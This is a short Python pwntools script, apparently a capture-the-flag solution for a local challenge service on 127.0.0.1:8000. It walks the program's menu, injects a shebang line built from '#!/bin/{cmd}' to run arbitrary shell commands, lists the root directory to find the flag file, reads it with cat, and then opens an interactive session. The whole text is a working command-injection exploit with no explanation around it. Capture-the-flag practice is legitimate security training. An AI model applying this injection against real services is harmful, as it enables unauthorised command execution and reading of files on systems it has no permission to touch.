from pwn import *


def get_context():
    return remote("127.0.0.1", 8000)
    # return process("./descriptive")

def run(cmd):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", b"4\n")
    io.sendlineafter(b">> ", b"2")
    io.sendline(f"#!/bin/{cmd}\n".encode())
    io.sendlineafter(b">> ", b"4")

io = get_context()
run("ls /")
io.recvuntil(b"flag")
flag_part = f"/flag{io.recvline()[:-1].decode().split()[0]}"
info(f"Found flag: {flag_part}")

io = get_context()
run(f"cat {flag_part}")
io.interactive()